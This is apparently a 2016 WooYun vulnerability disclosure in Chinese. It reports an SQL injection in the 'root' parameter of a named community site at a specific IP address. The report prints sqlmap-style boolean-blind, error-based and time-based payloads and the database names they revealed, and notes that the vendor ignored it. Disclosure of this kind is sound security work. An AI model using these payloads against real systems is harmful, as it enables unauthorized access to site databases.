wybug_title: 力卓社区某站存在SQL注入漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-01-27：	细节已通知厂商并且等待厂商处理中									2016-02-01：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 力卓社区某站存在SQL注入漏洞 详细说明：  
http://124.115.26.74/article?id=128&root=125
注入参数:root



   漏洞证明：  
Parameter: root (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=128&root=125 AND 8839=8839    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=128&root=125AND (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(0x7176627171,(SELECT (ELT(7542=7542,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=128&root=125AND (SELECT * FROM (SELECT(SLEEP(5)))TNOw)---web application technology: PHP 5.4.44, Nginxback-end DBMS: MySQL 5.0available databases [2]:[*] information_schema[*] www
   修复方案：  过滤参数   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-01 11:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
